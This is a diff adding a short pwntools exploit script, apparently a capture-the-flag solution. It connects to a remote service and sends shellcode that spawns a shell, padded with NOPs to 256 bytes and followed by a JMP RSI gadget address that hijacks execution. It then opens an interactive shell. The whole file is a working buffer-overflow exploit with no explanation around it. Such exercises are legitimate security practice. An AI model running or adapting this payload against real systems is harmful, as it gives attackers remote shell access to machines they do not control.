@@ -1,0 +1,14 @@
+from pwn import *
+
+r = remote(ip,port)
+context.log_level = 'INFO'
+
+jmp_rsi = 0x0000000000401041
+success(f'JMP RSI; GADGET --> {hex(jmp_rsi)}')
+
+p = flat([
+    asm(shellcraft.sh()).ljust(256, asm('nop')),
+    jmp_rsi
+])
+r.sendline(p)
+r.interactive()
